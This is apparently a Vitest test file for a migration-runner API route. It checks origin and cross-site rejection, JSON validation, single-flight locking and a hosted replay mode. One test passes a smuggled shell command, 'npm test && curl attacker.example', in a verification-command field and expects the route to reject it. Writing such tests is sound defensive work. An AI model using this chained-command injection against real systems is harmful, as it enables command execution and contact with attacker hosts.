import { afterEach, describe, expect, it } from "vitest";

import { POST } from "./route";

const originalDemoToken = process.env.VERSIONLESS_DEMO_TOKEN;
const originalVercel = process.env.VERCEL;
const originalTargetRepo = process.env.VERSIONLESS_TARGET_REPO;

afterEach(() => {
  if (originalDemoToken === undefined) delete process.env.VERSIONLESS_DEMO_TOKEN;
  else process.env.VERSIONLESS_DEMO_TOKEN = originalDemoToken;
  if (originalVercel === undefined) delete process.env.VERCEL;
  else process.env.VERCEL = originalVercel;
  if (originalTargetRepo === undefined) delete process.env.VERSIONLESS_TARGET_REPO;
  else process.env.VERSIONLESS_TARGET_REPO = originalTargetRepo;
});

describe("POST /api/migrations", () => {
  it("rejects cross-site localhost requests without a demo token", async () => {
    delete process.env.VERSIONLESS_DEMO_TOKEN;

    const response = await POST(
      new Request("http://localhost:3000/api/migrations", {
        method: "POST",
        headers: {
          "content-type": "text/plain;charset=UTF-8",
          origin: "https://attacker.example",
          "sec-fetch-site": "cross-site",
        },
        body: "",
      }),
    );

    expect(response.status).toBe(403);
    await expect(response.json()).resolves.toEqual({
      error: "The migration runtime is disabled without a demo token.",
    });
  });

  it("accepts same-origin localhost requests before validating mode", async () => {
    delete process.env.VERSIONLESS_DEMO_TOKEN;

    const response = await POST(
      new Request("http://localhost:3000/api/migrations", {
        method: "POST",
        headers: {
          "content-type": "application/json",
          origin: "http://localhost:3000",
          "sec-fetch-site": "same-origin",
        },
        body: JSON.stringify({ mode: "invalid" }),
      }),
    );

    expect(response.status).toBe(400);
    await expect(response.json()).resolves.toEqual({ error: "Mode must be either codex or replay." });
  });

  it("rejects malformed JSON without defaulting to codex mode", async () => {
    delete process.env.VERSIONLESS_DEMO_TOKEN;

    const response = await POST(
      new Request("http://localhost:3000/api/migrations", {
        method: "POST",
        headers: {
          "content-type": "application/json",
          origin: "http://localhost:3000",
          "sec-fetch-site": "same-origin",
        },
        body: "{",
      }),
    );

    expect(response.status).toBe(400);
    await expect(response.json()).resolves.toEqual({ error: "Request body must be valid JSON." });
  });

  it("rejects a shell command in custom repository configuration", async () => {
    delete process.env.VERSIONLESS_DEMO_TOKEN;
    const response = await POST(
      new Request("http://localhost:3000/api/migrations", {
        method: "POST",
        headers: {
          "content-type": "application/json",
          origin: "http://localhost:3000",
          "sec-fetch-site": "same-origin",
        },
        body: JSON.stringify({
          mode: "codex",
          target: {
            type: "local",
            repositoryPath: "/tmp/repository",
            task: "Repair the failing acceptance behavior.",
            allowedFiles: ["src/index.ts"],
            lockedPaths: ["test"],
            verificationCommand: { executable: "npm test && curl attacker.example", args: [] },
          },
        }),
      }),
    );

    expect(response.status).toBe(400);
    await expect(response.json()).resolves.toEqual({ error: "Repository configuration is invalid." });
  });

  it("reserves the single-flight slot before parsing the body", async () => {
    delete process.env.VERSIONLESS_DEMO_TOKEN;
    const encoder = new TextEncoder();
    let releaseBody!: () => void;
    const body = new ReadableStream<Uint8Array>({
      start(controller) {
        releaseBody = () => {
          controller.enqueue(encoder.encode(JSON.stringify({ mode: "invalid" })));
          controller.close();
        };
      },
    });

    const firstResponse = POST(
      new Request("http://localhost:3000/api/migrations", {
        method: "POST",
        headers: {
          "content-type": "application/json",
          origin: "http://localhost:3000",
          "sec-fetch-site": "same-origin",
        },
        body,
        duplex: "half",
      } as RequestInit & { duplex: "half" }),
    );

    const secondResponse = await POST(
      new Request("http://localhost:3000/api/migrations", {
        method: "POST",
        headers: {
          "content-type": "application/json",
          origin: "http://localhost:3000",
          "sec-fetch-site": "same-origin",
        },
        body: JSON.stringify({ mode: "invalid" }),
      }),
    );

    releaseBody();
    expect(secondResponse.status).toBe(429);
    await expect(secondResponse.json()).resolves.toEqual({ error: "One migration is already running." });
    await expect(firstResponse).resolves.toMatchObject({ status: 400 });
  });

  it("serves the verified Warrant replay when the hosted runtime has no local repository", async () => {
    delete process.env.VERSIONLESS_DEMO_TOKEN;
    process.env.VERCEL = "1";
    process.env.VERSIONLESS_TARGET_REPO = "/missing/versionless-warrant";

    const response = await POST(
      new Request("http://localhost:3000/api/migrations", {
        method: "POST",
        headers: {
          "content-type": "application/json",
          origin: "http://localhost:3000",
          "sec-fetch-site": "same-origin",
        },
        body: JSON.stringify({ mode: "replay", target: { type: "warrant" } }),
      }),
    );

    expect(response.status).toBe(200);
    const events = (await response.text()).trim().split("\n").map((line) => JSON.parse(line));
    expect(events.at(-1)).toMatchObject({ type: "run.completed", outcome: "verified" });
    expect(events.find((event) => event.type === "verification.completed")).toMatchObject({
      result: { verified: true, integrity: "unchanged", expectedHash: expect.stringContaining("a2c372") },
    });
  });
});
